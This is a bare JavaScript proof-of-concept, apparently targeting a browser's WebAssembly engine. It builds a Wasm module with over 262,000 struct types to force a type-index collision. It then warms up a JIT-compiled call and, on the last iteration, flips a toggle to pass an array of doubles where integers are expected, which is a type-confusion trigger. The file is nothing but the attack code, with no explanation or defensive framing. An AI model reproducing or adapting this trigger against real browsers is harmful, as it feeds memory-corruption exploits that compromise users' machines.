let evil_toggle = false;

function poc_function() {
    const build_wasm_module = () => {
        const leb128_unsigned = (n) => {
            const bytes = [];
            do {
                let byte = n & 0x7f;
                n >>>= 7;
                if (n !== 0) byte |= 0x80;
                bytes.push(byte);
            } while (n !== 0);
            return bytes;
        };
        const section = (id, payload) => {
            const size = leb128_unsigned(payload.length);
            return [id, ...size, ...payload];
        };

        const kCollisionOffset = 1 << 18;
        const kTypeAIndex = 0;

        const types = [];
        types.push(0x5f, 0x01, 0x7f, 0x00);
        for (let i = 0; i < kCollisionOffset - 1; i++) {
            types.push(0x5f, 0x00);
        }
        types.push(0x5f, 0x01, 0x7c, 0x00);

        const kNumStructs = kCollisionOffset + 1;
        const func_type = [0x60, 0x01, 0x6b, ...leb128_unsigned(kTypeAIndex), 0x01, 0x7f];
        const func_type_index = kNumStructs;

        const all_types = [...types, ...func_type];

        const rec_group = [0x4f, ...leb128_unsigned(all_types.length), ...all_types];
        const type_section = section(1, rec_group);
        const func_section = section(3, [1, ...leb128_unsigned(func_type_index)]);

        const export_name = "f".split("").map(c => c.charCodeAt(0));
        const export_entry = [...leb128_unsigned(export_name.length), ...export_name, 0x00, 0x00];
        const export_section = section(7, [1, ...export_entry]);

        const func_body = [0x20, 0x00, 0xfb, 0x03, ...leb128_unsigned(kTypeAIndex), 0x00, 0x0b];
        const code_payload = [...leb128_unsigned(func_body.length), ...func_body];
        const code_section = section(10, [1, ...code_payload]);

        const wasm_magic = [0x00, 0x61, 0x73, 0x6d];
        const wasm_version = [0x01, 0x00, 0x00, 0x00];
        const module_bytes = new Uint8Array([
            ...wasm_magic, ...wasm_version,
            ...type_section,
            ...func_section,
            ...export_section,
            ...code_section
        ]);
        return module_bytes.buffer;
    };

    let wasm_f;
    try {
        const buffer = build_wasm_module();
        const module = new WebAssembly.Module(buffer);
        const instance = new WebAssembly.Instance(module, {});
        wasm_f = instance.exports.f;
    } catch (e) {
        return;
    }

    const obj_A = [42];
    const obj_B = [1.23];

    const do_call = () => {
        const obj = evil_toggle ? obj_B : obj_A;
        try {
            wasm_f(obj);
        } catch (e) {}
    };

    for (let i = 0; i < 25000; i++) {
        if (i === 24999) {
            evil_toggle = true;
        }
        do_call();
    }
}
poc_function();